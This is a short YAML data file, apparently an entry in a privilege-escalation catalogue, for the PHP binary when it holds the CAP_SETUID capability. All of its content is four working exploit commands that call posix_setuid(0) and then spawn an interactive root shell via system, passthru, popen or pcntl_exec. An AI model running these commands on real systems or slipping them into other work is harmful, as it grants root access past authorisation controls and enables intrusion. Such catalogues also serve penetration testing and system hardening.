name: php
binary_path: /usr/bin/php
exploit_cmds:
- /usr/bin/php -r 'posix_setuid(0); system("/bin/sh -i");'
- /usr/bin/php -r 'posix_setuid(0); passthru("/bin/sh -i");'
- /usr/bin/php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h))
  echo(fread($h,4096)); pclose($h); }'
- /usr/bin/php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
required_caps:
- CAP_SETUID
